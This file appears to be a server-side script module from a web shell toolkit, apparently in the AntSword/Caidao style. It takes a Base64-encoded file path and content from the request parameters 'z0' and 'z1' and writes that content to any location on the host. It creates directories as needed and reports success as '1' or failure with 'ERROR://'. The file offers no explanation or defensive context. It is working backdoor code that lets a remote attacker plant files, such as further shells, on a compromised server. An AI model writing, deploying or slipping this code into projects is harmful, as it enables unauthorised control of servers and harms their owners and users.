<%

var paramMap = request.getParameterMap();
var szFilePath = "";

if (paramMap.containsKey("z0")) {
    var b64Path = paramMap.get("z0")[0];
    if (b64Path != null && b64Path != "") {
        szFilePath = new java.lang.String(java.util.Base64.getDecoder().decode(b64Path), "UTF-8");
    }
}

var fileBytes = null;
if (paramMap.containsKey("z1")) {
    var b64Content = paramMap.get("z1")[0];
    if (b64Content != null && b64Content != "") {
        fileBytes = java.util.Base64.getDecoder().decode(b64Content);
    }
}

if (szFilePath == "") {
    echo("ERROR://File path is empty.");
} else {
    try {
        var path = java.nio.file.Paths.get(szFilePath);
        var parentDir = path.getParent();
        if (parentDir != null && !java.nio.file.Files.exists(parentDir)) {
            java.nio.file.Files.createDirectories(parentDir);
        }

        if (fileBytes == null) {
            fileBytes = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 0);
        }

        java.nio.file.Files.write(
            path, 
            fileBytes, 
            [
                java.nio.file.StandardOpenOption.CREATE, 
                java.nio.file.StandardOpenOption.TRUNCATE_EXISTING
            ]
        );

        echo("1");

    } catch (e) {
        echo("ERROR://" + e.message);
    }
}

%>